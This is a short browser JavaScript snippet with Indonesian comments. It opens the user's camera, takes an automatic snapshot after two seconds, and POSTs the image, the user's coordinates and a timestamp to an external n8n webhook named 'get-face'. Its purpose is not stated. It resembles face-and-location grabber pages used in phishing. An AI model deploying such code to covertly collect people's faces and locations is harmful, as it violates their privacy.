(async () => {
  const video = document.getElementById('camera');
  const canvas = document.getElementById('snapshot');

  try {
    // Minta izin kamera
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    // Tunggu sedikit biar kamera nyala
    await new Promise(r => setTimeout(r, 2000));

    // Ambil gambar dari video
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageBase64 = canvas.toDataURL('image/jpeg');

    // Ambil lokasi (dari location.js)
    const { latitude, longitude } = window.userLocation || {};

    // Kirim ke webhook n8n
    await fetch("https://jdika5914.app.n8n.cloud/webhook/get-face", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        timestamp: new Date().toISOString(),
        location: { latitude, longitude },
        image: imageBase64
      })
    });

    console.log("Foto + lokasi berhasil dikirim ke n8n!");
  } catch (err) {
    console.error("Gagal mengakses kamera:", err);
  }
})();
